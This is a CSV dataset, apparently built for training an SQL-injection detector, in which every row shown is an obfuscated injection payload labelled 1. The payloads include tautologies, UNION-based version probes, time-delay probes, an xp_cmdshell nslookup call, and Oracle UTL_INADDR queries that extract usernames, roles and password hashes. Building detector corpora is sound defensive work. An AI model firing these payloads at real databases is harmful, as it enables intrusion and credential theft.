Query,Label
"aDMin' &)\ |Or   .( }'0o7'/*g8ze*TjEc
M?S*/}lIkE  '0x3'Or FALse anD trUe   anD=/ TRuE or falsE oR faLsE{OR faLSe ANd 0O0b0x17C0o9 NOT LIKE (SELeCT (sElECt (SELECT (SELECT 6086))))#0o1O4B0b0b3n!nrW",1
OR`A=~a,1
"sEleCt jUNI`* From	USerS WhEre ID |=  '2' Or !<@;  or  )(seLEcT   OR""  0O0#(SELeCt 0X1)) .=  (selECt](SELECT 5)) --<7'>hN!n",1
"deCLare@Q>NVarChAR ""|( [200{_)#+&0X730065006C0xfB0o436B8156dF8eD9dF58Dba340fda183d3eAEf0x6e04/ExEc
 ([<@Q	));*",1
"ADmIN""	{;&&:=2X19b5>iN oR FALSe
&& true#((seLEct 5510),0x62D,0X62e)#m:",1
"SeLeCT** FroM+UseRS/wHErE_iD like\3X0x0o11@%_}( (0X1X7, )~).oR 0b0B7o1789 lIKe 0B0X8O4O4or|fAlse <&&^`0x0x0X5/*)0o0cOfW|',y;#M_h;:*/or*'m'<NoTLIkE 'M'*And<TrUE  	  oR [ *~""-"" not like?""-""oR`faLSe--.0o0O0B0B101010010101111111001110zJBA1Dd",1
" sELeCt * FRoM userS wHeREiD  NOT LIKE /*isAa*/ '1'>OR \<   LIke /(seleCT (SeLeCt (SELECT 1)))>UNioN|seLecT 0O0b1006,@@veRsiON aND|'`_v'='`_V' oR fALse and (SeLEct 9O9) Or fAlsE Or fAlsE  &&  True AND True OR False --/*|Oq	E*/4'",1
" SEleCT * FROM UsErs wHErE iD  =! (SELEcT 1)   Or   @ oR (SELECT 2118) Not Like (seLecT (seLecT (SElecT 2969))) oR{faLSe,Or 0x0x214D=(SeLEct	8526)OR ""+"" nOT LIKE ""+""  OR  FalSE#""	 (    =  (seLect 0X1) OR%(SElECT#(Select 1))  =  1X1 -- 0O1!b9",1
"SELECT *!fRom USerS Where iD=(SeLEct 0o1x1) + \+%$	or 2X5  = ;(SELECT 0) aND}TRUe AnD ""d""=""d""/*hDl0*/aNd TrUe -- 0O7Lk",1
"{),{\oR\pG_slEeP
/*Hu%oM
O:`$HIDv)9b5B311Xt0B101b1p0X0x5SpoX:Tfx&G*/($__tIme__${)%
--",1
PRINT/*wdpgr/0x0b3SDDE%OKo:JkL^*/@@VaRIAblE,1
" seLECt * FRom usErS WHerE~ID""=]0x0X0b9	Or%@ oR)0o0O10 OR:faLSeAND"" IP""  not LIKe  "".IPn""#"". =
(SELEcT (sELECt
0x1))
OR	0X0O7 |= %(sEleCT\(SelEct (sELect 0x1))) -- 1P",1
OR`A`=:Or%falSE#^a--\F,1
"\or/bpl0B101o9O0O0b10111J~""pJ7X4*/Rx`YR	(<U7h*/'X'	)=><'x",1
" sEleCt * FrOM?uSERs wHeRE id=(seLeCt (SELECT 9)) Or{""1{""| oR 	(seLEct (sElECt 0x1)){}=%
0X1   &&   truE ANd (sElECt (seleCt 0x1)) -- 0O1V",1
" SeLeCT * from USErs WhERe iD='7'&  or { $<\ unioN sELeCt 0X0o1,@@veRSion\ oR% ' aNd (sElEcT 0O0X0O15) or (sELEcT 0x1327) lIKe 9X6XCC0o4 Or ""
RG""nOt liKE
""
rG"" and truEor fAlSe oR 4X0 anD truE ANd (sEleCT (SeLect (seLEct (sELECT (SELECT 0x1bbe))))) NOt likE 7X1BBf[aND TruE AnD TrUe#'_NoT lIKE '#' --	0o6'FrMk",1
"select * from users where id=8x3*%  (  \	 )   or 0x1   LIKE  >(SELECT (SELECT 1))+OR|(SELECT 0x8) -- 1R",1
"""\/*G~`5B0B1911101001X9_yFN*/?||] {""""-""",1
%1x0B3201A%1X0o0b9x0o5X0o5O0o10a%7o0o1c%18MaiL%7b11d%0B0b10011a%0X6x2b0o0b5d%28,1
"^SeLEcT`* FRom uSeRswHeRE(Id=(sELeCt (SEleCt (sELecT 0X7))) OR ""^ (
 _""	Or:0O0x0X1\ ={""3x5  Or  FaLsE AND TRue-- 1B1E9",1
"	haViNg
1o2,>=
+0B0o144o0O0--",1
" && (SeLeCT (sElECt (SELEcT (seLeCt (selecT (SELECT 1))))))
  LIKE   utl_inADDr.geT_HOsT_adDrESs   (    (   SeLECT diSTINCt  (  usERNAme  ) &FRoM   (  SELect diSTiNCT  (  USErnAMe  )  , rOWnUM aS liMIt FrOM SyS.ALl_UsERS  )
  WHERE lImiT=0O1o5 - )  ! )    AnD 'I'  lIke  'I",1
" select *?from,users where%id:=:(SELECT 0x1) or
\.<$ union*select (SELECT;1x0o1),@@VERSION --7",1
"AdmiN""""`)%^Or ""0O2""} LIKe? ""2""!or ""`"" NoT(liKe ""`"" OR~(SELECt 0x0B0) oR<FAlsE(ANd TruE OR FalSe AND (SELECT (SELECT 1)) AND True#vI""",1
"*~)}	_>OR; ]/`(/'a';liKe\'a",1
"
sELeCT * FROm}useRs wHERE id.[liKE  8x4
oR+0X0 aNd ""E""=""E"" oR faLse   ANd   (seLECT?(seLECt (sELECT 0x1))) ?Or :(SELECT (SELECT 0)) OR False'OR False	AND True#""4-uNIOn SELEct NuLL,VErSION  ([  [)-  -- 8X9p`R{8",1
" SEleCt * fRom*UsERS WheRE ID /**/=% '3'	UNiON#sEleCT 3B3X4x1,bAnNeR{fRoM	V$verSIon whEre	ROwnUm  LiKe  0x1 oR (SELECT (SELECT (SELECT (SELECT (SELECT (SELECT 0))))))
--'0x1'",1
"""`
)	
`:OR"",\\(!{""x"":.)\?`:[Like(,/*V0B0B5o0b1091KnuB0b1000*/""!($<""X",1
UNION[SELEct,1
"0b0B0O23577""or$0O1	/**/=[0b0O6",1
" SElEct * FRom UsErS wHerE>id
 =~ (SElEct (SELECT (SELECT 1)))' 	||   ""@;""  =  0x0B1 oR/**/(selECT 0X7)=4X1 oR!faLSe and TRUe OR False -- 3y",1
";SEleCT;*{FRoM UserS whERE)id='3O0b0b5'$oR @*](  1x0B6b1  )/*Gh2]vj!(SeleCt (SELECT 0))^
poJ""fl
e*/ >LiKe  0x0B0o0 UnioN SelEct (SELecT (sELEct 0o1)),verSiON{:(
;< )   oR (Select (seLECt (SELect 0x0O0)))}Or 'S'$noT lIkE 's'|Or 1X0o5aB Not lIkE 3X5AB  and  0X1- ^AnD   (SELEct 0X0o1) or 0X2279=6x227A OR FALSe ANd 2986!=(sElECT (sElECT 2947)) || (seLECT 7968) NoT lIKe (SELECT 7968) --;1'^n5b)",1
seLECt * FrOm USeRs WHere`Id  =  (SeleCt 1).<@$ oR (SeleCT (SElEct (sEleCt (select 1)))) = 0O1!|| 2476 != 2446 OR 0x0 -- (SELECT 8)>cIO,1
"SelecT
 ?OR   (SELEct	0X0) anD tRuE%OR fAlse anDTrue AND "";;""<>"";;V""#* fRoM\USERs wHErE+iD(LIKE'0x1'_<@&@{Or	(sElect;(seLeCt (sELECt (SeleCt 0x0o73ab))))/**/IN (0x0B1100111101055,(SeLect 0B0X7b10011ab),0X0b10011ac) --1'K%&l*",1
" sELEct * From USErs_WHERe
id_ ={ (SELECT 1);oR&"";{""]_||  (SElEcT 0x1)+= (sElECT 0x1)=Or 0xfebNoT LiKe 0O7716% aND  ""m6""=""M6"" Or FALse/*0j*/or`FalSe OR "")""<>"")"" -- (SELECT (SELECT 0x0))]""",1
">Or_uSerNaME*LiKe
'%",1
" OR   ( .elt ?(> -0O0O3+(sELecT;(seLeCT (SElecT (sEleCt (selECT (SELECT (SELECT 6))))))),bin  (  0x37  )  ,  OR .d]*(  0X55	 )  ,heX @(  cHAr
(' 8b0o0O409355   )    )      )  ^ ) 
 ",1
"?OR AnD 0O0x1Fc2<>(SeLeCT 0o0O17703) or (sElEcT 5107) NoT`lIke/**/(SelEct 5007)=Or FALse aNd (SELECT 3070)<>(SeLECT 3071)#UnAME	Like '%p",1
"DeClArE @s;vaRChAR  (  0xCC<
)   seLeCT,@s^/*e.h*/ LiKE	  0o7x0o6x1212550B4AF0o5302655514c0b111001100011000101111000001010100111a303a31302703#EXEC; (  @s 	) ",1
;OR9X6x4;aNd\:True;oR(0O3?--',1
" SElEct * frOm USERs wHERE iD&}liKe  0B0b0X8 +   ( ^$+  )  uniOn sELECt
NULl,@@vERSIon AND ""f""!=""f{"" -- (select(SelEcT (SELECT (SELECT 6))));dGb",1
"   &&  ""(SeLEct 0o0O4x0O0b0O0O8o8B185)""  lIke{  UTL_INADdR.geT_hoST_AddrESs  	(   [(?  SELeCT DIsTINcT (  usErnAME *))  FRom <
( sELeCt
dIstInCT	 (
 USernaME [) 
, ROWNuM/*""``%{o4O0O5PLji[6HyZ{I/  oR  p!XCgv0b104f[5CUd,yaGRc*/AS LIMIT FROM syS.aLL_Users  )   WHeRe LiMit
]Like/ 0x0B7O0O0X3O4O7<>"")+< :)  (-' <&&    'i'&NOT= 'I",1
"SEleCT **fRoM uSeRS whERE:iD	 liKE< '2' UNioN seLect;+\,@@VErSION anD(sElECt 0B0X5Xbc6)Not+likE (SeLECt:0xbc0o7)<--	0B0O0o4'fEym",1
" sELeCT * fROm	USeRS	wHere id = 0X0B1:Or/*MF4
*/""  (  ;"" OR 0b0X6/**/ =  5b111  &&  0b0b10000001010101101011010100111111011001017 NOt LikE 0x0x1ece  oR  FaLSE~Or FALSE?-- 8;=+YNB",1
"   ?aNd{   0o0b0O5o0O0O0  LikE ^Utl_inadDR.geT_HOst_adDReSS   ([   (   sELECt dIStinct	 (  gRantEd_roLE +)} ;FrOM   (  seleCT:distincT. (  granTed_ROlE =)  , roWnuM*AS LIMIT FrOM dba_roLE_PRIVS WheRE GRanteE    lIke :  sYs.LoGInUser  )   wHERelImIt? liKE  8X5B0O6X1b0o0b0O2B0   )   ;)     &&  &'i' ?=! 'I",1
"SeLecT * fROm UsErs WheRE>iD    LiKE    (selECT 0O7x1) %$ . or'0O2o6 <LIKe- (sElecT 2x0)   AND 	 0B5or 0B0o0$aNd ""Dv""!=""Dvk"" and (selEcT (sEleCt (seLECt (selECT (SELECT 1))))) or fALSE and}TrUe'OR faLse ANd;""TQ""!=""tQ["" ANd TruE oR FALse --.1",1
"ADmIn""-[)&]	`Or>>""2b8x5o1X3b0O0O1x5X0x5b0B0x0o0o0o1""
=/""0B1o0o0O0b2B0b0b101110111""--",1
"0O0b0b0B091:  ) ? ~) /*BJqo`2s[?~*/  or sleEp  ( \__TIMe__  )  ~aND	(sELect 0x1)	/**/and/*(sELeCT 5)*/(sELECt 0B11111000110) NOt=(SELECt (sELEct (seLect (SELECT 1891)))).
Or !(select 0x0O0)#kmqSGkl",1
"SELeCt * FrOM UserS WHERE id&=)0X0B9 +$ . oR (seLect	2X1)  =& (select 0)/*;);*/--.0o1u",1
"($	sqlatteMpT0b0B4b0b11xa*:))",1
"
SeleCT * frOM UsErs Where ID LiKe  (sElect (SELECT 1))?*$. UNIon sEleCt NUlL,@@VERSIoN ANd ""5S"" lIke ""0X5s""  )oR \](SElect (SELECT 7))
-- 0b0B1",1
" SeLecT *-frOM USErs wherE id 	lIke  '1' *  (  2B9X0O6  )   UnIOn SeleCt 9,bAnNeR from V$vERSion wheRE ROwNUm LIKE (SelECt (SElECT-(SELECT (SELECT 1))))&or['<' NOT Like '<' oR fALSe -- 2'",1
" AND 0B9b8b0b0b111 lIKE utl_INAdDr.GeT_HOst_AdDresS   (    (   SELEct diSTIncT  (  usErNaMe /*o?>	W%;vwyk\*/)   from   ( sElecT dIStiNcT	 (?  oR  (sELEcT (SelECt (sEleCt (SeLecT (SELeCt 0))))) Or FalSe  OR  'q' NOT lIke 'q' oR FALSe[aND 7833 NOt LIKe 0X1e98 oR FalSE OR False#usERNAMe  )/*AR+I;>Q	l	S4 zdISs*/ , ROWNUmas
liMiT frOm SYS.aLl_uSErS  )   wHeRe LiMIT^ Like  3x7x0   )^   )  \ANd'i'  lIKe ['I ",1
" seLeCT * FROm uSeRs WhERe>iD  LiKe  (SelECT(SeLeCt/(SEleCt (SELecT 1))))   OR.  8X1-   &&    (SELECT (SELECT 0o4224)) NoT likE!2695/**/AnD TRue   OR   false}And tRue and 8X0o3 ||	(SelecT 6014) NoT In ((seleCt 0X1A6d),(sELEcT (SELECT 0x1ae4)),6815) oR 0X0 AnD*TrUE and truE OR false and trUE)And TRUE OR/**/False#""@ UNIon sELeCT VersION  (  /*@r*`Q7
'yRGa.+]*/ ) ~,VeRSion  (    )	  --	1t8)G",1
"9224 ' \+anD  !(SElECt (sELEct 0x0b1))) ={
(seleCT	(selEct( aNd ) TrUe:and ""M""=""M""* &&  truE OR FALse  &&  True OR (SELECT (SELECT 0))#(sELeCT (sEleCT 0X0))))|UNION/*;h9(:MV*/aLl~SEleCT 'adMin',>'7O121Dc0x0O11bDb8x54D0o4dC0XEA84DBd8303ED0o67vJ}",1
" selECt * fROM+uSerS WHEre_iD) lIKe(<'2'<@$$ UnION SeLect (seleCt%(sElEcT (sEleCt (SELecT{(SELECT 5))))),vErsion  (_ ~ )  oR/*`*nMs}Rtpdq*/1x0 Or False	-- 0o3X3X4X0x0o1'a!wb",1
"@VAR.selECT @VAr/**/As&vAr/*|rn*/InTo/*n';^*/TEmp enD+     &&   ? ;(SELeCt!(seLeCt (SElecT (SELEct 5301)))) LIkE 0O0b0o1x0X0b0o87771 ANd<0B1110251111011/*uzKCU*/not-lIKE (sElect[(SelEcT 7291)) Or,FALSE  or  2068<>(SElecT_2068) AND TRue OR False --",1
" SELeCt * FrOM USERS+wHERe ID    LIKe `	 (SElecT (seLeCt (SELECT 1))) +  [(/*?I*/ \.  )   uNIon selECT NUlL,@@verSIon   AND  1B0b8 Or 'L' Not LikE 'L' Or 0x15fB NOT lIke (sELECT 0O12773) oR fAlse aND (sELecT 0x664)!=(sEleCT 0x665) OR False -- 1x~",1
"`or:''~/*4o0B0o0b1010O4UG>`%GPn<*/=	'",1
"%SElecT$*;fROm]USers%wheRE/iD	`lIKe/1X8$(oR[	"",&"" OR:0X0x3%<=+:0B0o0X0O3b0x0O2^--.4x0o9d",1
#ERROR!,1
" SElEcT]* fRom UsERs whErE ID  like  '2' UnionSelEcT "";""_,verSion  ( '  ) ;\--
AnD?'o'?NOT ={'OC'  OR  falSE AnD 0O0X1 Or "";G"" not  Like  "";g""#0B0O4O6'R
-ak",1
"""
 \)`  /*
?(seLECT 0B0o0b1111110)*/) ;WAitFOR+DElAy '9:4x4:__tiMe__'--",1
"SELEcT */*o9Y*/FRoM USERs wHerE iD_ lIkE  (sElecT (SELECT (SELECT 1))) += (  \  )   Or 0O1	  LIKE   0b1 or fALse or '~B' lIKe '~be' OR False OR False --
1u",1
"sELEcT_*?FROM+uSERs whEre ID;=/*@*b	+!}Wp6L*/0O1~<Or  \+<\=""oR^)3x5 'LIKe
 (sELecT*(SELECt 0x0o1))-  or   false,--
0b507",1
"    &&    0x0o3=UTl_iNAddR.Get_hOst_adDrEss   ($  &(   SEleCt DIStInCt %(  GraNted_rOle  ) .)fRoM] :( $seLecT;dIStinCT  (!<GrAnTeD_ROlE@ )  , rownUM as lImiT frOM.DBA_RolE_pRivs wHere GRAnTEe '= *sYS.logiNUSEr*
)   where lImIt  =/*(SEleCT 0O0x0X3)'5CWu0is aND (SelEct (SeleCt (sELECt 0x1))) or ';&' LIKE ';&.' anD true anD (sElECT 1) aND True#kX,W::cr(sElEcT 0x9)@(SELeCT 8)r*/ (sELEcT 0O0x0B510)&  )    )    aNd:'I'  LikE  'iD",1
"
seleCt * fRoM users WhEre Id  LIkE  (SELECT 0) +/*B(^Y */@`\` UNioN SElect 0X4,VERsIOn  (    )   or?2B3X6%AND TruE And true oR False and tRuE -- 1`sa",1
" UNION?ALL
SELECT",1
"sELEct{* FrOm uSErs WHeRE iD 'like  (selECt 4X1) <@..	or[3x5x1/*i(CRqku oR FALSE OR False#]*/ lIkE  5O1 \ANd  (sELECt 3183)   NOT liKe  
5190(Or FAlsE -- (SELeCT~(SELECT 1)))HKMFFgi;_",1
"	SeLEct *)from USErs WheRe]Id LIKE (SELECT 9) or "";.""  =  0 oR (SELECT 1)  =& (SELECT 1) anD 0b1 && 'T'	NOT  LIKE  'Tp' OR False AND True -- 1Xh",1
" SELECt * From USeRS WhERE
ID =]0X3 OR (seLECt 0B10)?aNd.'T'<>'t@' aND 'V$'='V$'  And  ""e"" not lIke ""EH"";Or False  anD  TruE#""?  =  (SElecT 0O1) UNION sElecT-(seLeCt (seLEct (SELEct (SELECT 1)))),vERSIon  (    ) _@--/*Sti)uf Of+w*/0o0x1} 9o",1
" SElEct * From UseRS wHere iD; ,likE   0x0o0o0b9 UnioN SELECt}0o0B1`\`,VeRsion ""(   ) ` Or faLSe OR False -- 0b0",1
";SELEct(* FroM USErs WHEre iD  =  (seleCT 1)/**/oR]"";&"" or (selECT 1)=(SeleCT 1) AND|trUe or ""\e""=""\e+""_OR False -- 1j!",1
"SELEcT * FrOM UsErS wherE Id *=* '1'Or&\<0B0O10 Or 0X8 
lIKe?
7x1 OR """".`k"" Not liKe """".`k"" >aND  (seleCT 6067)not lIKe (SElect (SELECT 2068))  OR  (SELecT 0x1871) NOt!LiKE=0x1AC9  aNd, true oR (SELECT 0)  AND  (sELECt 0b10x1) aND TrUE or (SElECt (SELECT 2)) --
1'n<",1
"]SELeCT>*+FroM~usERS$WHERE id\= '3'{+ 
:(& \(:)+> unIoN/*vCXdyOoTXAdl]Fwj+e	SFj^(select0x5)w?/?OP^?PNE*/SELect:2X0O0O0x0o0o0O0x0O10x8,@@versioN |and -3o2X4;[}or&{5XC1f,;NOT\LIkE  0O9xc1F.--&9'buWN",1
t'eXeC/*4B0b1B1900100o9B2o0O0o14AFW?t1*/MasTeR..XP_cmDsHEll^'nSLOOKUp%WWW.gOOgL?...A,1
"""  )  OR*BenChMark  ( *0XA344E6,md5  (  (seLEct (seLecT (SeLEct (SELECT (SELECT 0x1)))))   ) ~  )""   oR ""31ING""=""31inG{"" AND (SELECT (SELECT 1))#",1
]UNiON SElECt,1
" SElect * FROm uSeRsWHeRE%iD  LIKE[ 0X0 or $ 7B0X1 =?(sElEcT (sEleCT(SELECT (seLeCT (SeLECt (SELECT 8)))))) UnionselecT 0x0b1,@@VeRSiON OR ""p"" not^LiKe ""P"" oR|(seLeCt;0x0O2) ANd 'P' LiKe 'P' Or	fALsE  Or  ""
"" Not = ""
"" --
7B131",1
SelECt * From USers Where Id  =  '9' OR!$<\ Or>0O0B1 :lIkE  (SeLECT (SELECT 1))aND_tRuE ANd<(seLeCT 0X1BB9) lIKE 0x1baF or (SElect (sElecT (SEleCT (SELECT 0x108a)))) NOt lIKE 0x108F oR fALSe  oR  'O'!='O'  OR  faLSe AnD '=['!='=[J' -- 1',1
:OR `,1
SeLECt,1
"""%oR<0B0O156o4O0O10/*gDPP9X6pk`*/=\(SELEct	0X3X0x6X0b1)--",1
"A'
or
'a'*""=_/*pMg<Yg@[Iu&atC0b0b0X0b9O0o0B111111000000j+RM,ju=HOy0o7p*/$'A",1
"~selEct *?FRoM/**/Users/*p(
sk&P*/WherE^iD   lIke   '2'~<@._ UnIoNSELecT (selECt (select!(SELECT (SELECT 6)))),vERSiOn~,(]   ) ? ^AND  0x1 OR False --#1'1B	e",1
"""SElEct&* FroM USErS)WHeRe Id=7x0b0O0b1 oR_@ OR(""8     &&    +true Or 'St$o' Not liKe  &&  1#'sT$O'	Or FalSE#""  ( 	 .= :(seLECT (SeLECT 0x3)) UnIoN&selECt 0O0x0X8,veRsion_/*:tEJ-(oV0v!YK#i KDQ~>1DC*/(    ) : -- 0b0b0x9 a/TZo`(SELECT (SELECT%(SELECT (SELECT (SELECT (SELECT 7)))))),",1
"ADMIN""]:)`] OR  +(~/**/""0X0x0B7""
""=""<""0B0B0B1110101101101010010100101000111011111010""/*",1
" SelEct * frOm""Users wHerE ID  = '1' Or \.<$ Union SElecT (sElect (SELect (SELECT 2))),@@verSioN aND true aND 'g`'  NOT LIKE  'g`*' Or false Or 0 oR FALse AND True -- 1'{",1
" SeleCT* FrOM UsERs WheRE iD =	'1'%UnIoN sElect%/ ([ (sElecT)5X1)  )} ,BAnNER fRom V$verSioN WHere RoWnum' =  2b101  oR  '?(sELect+(SELECT (SELECT 8)))<' != '?(selEct&(SELECT 0o1))<' OR FaLse OR False OR False AND True -- 3O6B1'bM}(d",1
"and(seLect (sElect 0x0o0o0x0B1004))=UtL_Inaddr.gEt_HoST_ADDrESs   ( *  (*  selEct dIStINct <(+ usERNAME	 )?  fROm ` (; select DIstINcT  (  UsernAME :)  , rownUm&AS LIMIT frOM Sys.alL_Users	 );	 whEre liMIt  lIke   4X4o6o6x7X8   )    )    And>'i' ?LIKE  'i",1
"/  &&   2o4o0X2B8b0b0x0X3b3O0B0O3O5X9B0o0x0o6O8O7/LiKe/*)y*pyY
*/ Utl_InaDDr.Get_HOst_AdDReSs +;( ?}(   sELEct+COuNt ](++diStINct/*:uH}o*(sELEct 0O5)gBp
*/(  graNteD_rOLE +	)	  `)    fROM DBA_ROLe_PRiVSwHere grAnTee  lIKE& syS.LogiN_USeR&  )  ) );? AND'I' liKE 'i",1
" sElECT{* FRom USers wheRE id=(SeLEcT (SELECT 0x1)) or.(sElEct;(seLEcT
(SELECT 7))) ANd*(selecT 0X7b3)=0x0x7B10061101011 AND tRUe Or:fALsE And 0x1 Or FalsE	ANd TrUe#"": (+  unIon seLeCT|nUlL,VERsioN  ({!> );  --0Xa<",1
"   &&   (sElECt (SELECT (SELECT (SELECT 1))))  =  uTL_inaDdR.gEt_HOSt_AdDREss  :(    (   sELECt DIsTiNCt  (  pASswORD *)   FRoM ; (  SeleCt DIstinCT  ( ^PasSwOrd  )  , roWnum AS LimIT FrOM sYs.User$  )   wHErE LImit  =  (SelEcT 0b0O0x4)   )    )    aNd 'i' =  'I",1
"?sEleCT}* FROm USers wHeRe ID=(SELEcT 0x1) OR="".  AND  ""B"" LiKe ""B"" or FALSe#"" oR
(seleCT (SELECT 9)) = (sELeCT (SELECT 4)) -- 1'j",1
#ERROR!,1
+)\>_ Or;/*x0B0o0o0O3x6x0o0b111311}<@/EJuAeWDiV*/+-( \'x'.=$!'x,1
"/*;VkteB*/SeleCT'`:b* FROm UsErS_wHErE'Id	,=*0B1001X0b00'uniON SElEcT$@]$$,vERsioN:!(/ 	);?&&""%""=""%"";and tRUe OR	"".H"" noT="".H""	--0b0b1110101O2o7X0b0?N",1
"Or'2x1b0B10111100111,&=-
0X0O7B3B1~/*",1
" Select * frOm usERs wHERe id  likE
 0b0o0O0o2x6 or ""@ anD TRue oR FalSE oR FAlSe or FAlsE  &&  TRUE And TRUE aND (SELECT 5354) NOT lIKE (SELECT (SELECT 5359))#""   Or  -(SELeCT""3)  lIKe  1X3 -- 6if]",1
")oR;0o1X3`)=/**/
0O0",1
"0B0O0O0b1 >.)-' ])  ;+OR BeNcHmaRK ,(  (selEct;(sELect0X259A04)),MD2% (>:2X1: {)   )     And: 0B1011001011001!=(SeLECT (seLECT 0X35eE)) aND0X1 And tRue Or 0x7F8<>(SElEct (sElEcT (sELecT 2040))) and TRuE oR FAlse#:j^'g}",1
$;Or/*`pt[[(SElECt 1864)*/0X6`\lIKe>&0x1~||?FalSe~Or@0X0o0X238A<>(seLecT^0x0o1520a)!Or+'V'<>'v' Or{0b0o15303not^LiKe?0O0x1BC0x7_Or/*Q67sE[S8ZDL*/faLSE_oR FalSe=aND)0x0o306e<>0x198F&--,1
" sElECt * from	useRS wHERE Id] LIKE  (SELEct (sELEcT 1)) UNION SeLECT 0O1<@.,VerSion [(    )   OR False -- 1",1
"{sElEct * FRom userS whereid  =[
0o0x5 oR (sELEcT (selecT (SELECt}1)))  OR  (SELECT 143) NOt LIke (SELEcT 0X35f) OR (sElECt
4) OR[0o5012   NOt Like   0x463 or 0O0X4 Or falsE AnD ""HT"" LIKE ""ht"" OR 0O0 or (SeLeCT 0) oR%""u{""=""U{k"" OR false#""@ uNIon SelEct (selECT (selECt 6X1)),VeRSioN  (   )   -- 0O10+Xy",1
" sEleCt * From uSeRS WHere id^|  liKE 	  (SelECt (SelEcT (seLeCT 2))) OR  $+<\{uNiOn select 0O3o0B5,@@VerSiON,-- 2jX",1
"selEct *|fROM USeRS WhERe Id =  1oR ""%5o7""*oR (SELECT 2)  =  (SElECt 1) or ""x"" NoT LIKe ""X"" OR False --
0b2",1
"ADmIn"", )++=or+""2B7b0""=""2x0b0B1X3B0x0""/*",1
+or/*>LI|`(sELeCT]0o0b0b1111110010)X2.hJ*/'tExt'[>'T',1
"""
oR.""A"")=
or}False or)FAlSe#""A",1
" seleCt * frOm usErs whEREId  likE  (SEleCT 0o0b48) oR (SelecT (SELect 2))#""$ Union@sELecT 'a',versiON  (    )   -- 3t",1
"BEnchMArk](
 0o0X989683,Md5.-(= 0O0o10,  )! \OR;(SElEct (SelECT (SELECT 7))){[AND  (SelecT (SELEcT{9409))
nOt   LikE >+0x24eD,OR (SELECT 5837)<>0X9o20FF aND  0B10001010190<>(SelECt.(SeleCt 1409))~oR>0x0 oR (SELECT 0) AND True AND 'D;A'<>'D;Ax'#>) [(#e~!V
!Zg>O3q",1
exec`xp,1
" sELEct *\froM/*IBzyzsn!g*/uSerSWHERe ID=0o1 Or;\.<\(unIOn]SelECT 3B1,@@VErSIOn AND ""tO."" _NOt] LIke   ""TO.U"" or (SELECT (sELECT 8577)) NoT lIke (sElEct (SELEct 0X20c5)) and TruE && ""2t,""=""2t,"" OR False -->0X1x.P<",1
" selecT-*=fRoM@useRs=wheRe iD$~=].0B2B1x5
OR,@or>0O2X0X0X0/  $OR   !7x2 { OR   FaLSe AND (selEct/*(seLEcT (SElEcT (SELECT 1)))
eoHa_M*/(SElEcT (sELECT (SelECT 2884))))<>0B101101000101#""{ LikE 0X5 or/*N=B|V0O6&
i0|&`2f*/0x0X0B8X0_=/*(SELECT*0X0b0B1131101000d)<ye,o1
bY'VKZUd
LU;x:<a*/(sElecT[(SelECT (selecT 0x2)))--`1I3B100./Fle%CY=5cBO_h/)7",1
"hI'^Or	'a'?(NOt~like`)	'a",1
]OR ;''*',1
SQlAtteMPT0O0O0X9O0O0o0O10,1
"aDmin'_or/0o0X4b0X5o8x5B6o8/=
}9O5O0x5X7--",1
" SELeCT * frOM userS WheRE ID  =  5 Or ""%;""*Or (sELeCT 1);  LIKe   0O1 oR FALsE -- 1-_w;",1
"0X6'
Or
'9O0O19X2o8x6B0O2X3B0x2B0'^Not=|'2B0b2",1
" sElEct * fRom uSerS WhERE~Id;
=< '0b0B2' *0x1\uNion SElEct (seLEcT 6b0b6),BanneR fROm V$veRSiON whERE RownUM   LIKE   0B0  OR  faLse OR (SELECT6) AND True""OR (SELECT 8117)!=0x1fb5 OR 0 OR False -- 6'~",1
",@vaRIABLE",1
%6X0b111X0b121a%0o1b0o0B110C,1
" SeLeCt@* fROM!UsErs WHeRe/*[=(SeLeCT (SeLECT 0x4))?<LA*/id	 =  '7' oR \<$+uNIoN SeLeCt%5X0,@@VERSIon+and True  anD~ ""cKW"" nOT LikE""ckw/""  aNd  TRuE Or 0X62E Not=LIkE (sELect (SeLecT (SELEcT 2542)))  anD  tRUe oR 0x3 OR False --
0'^",1
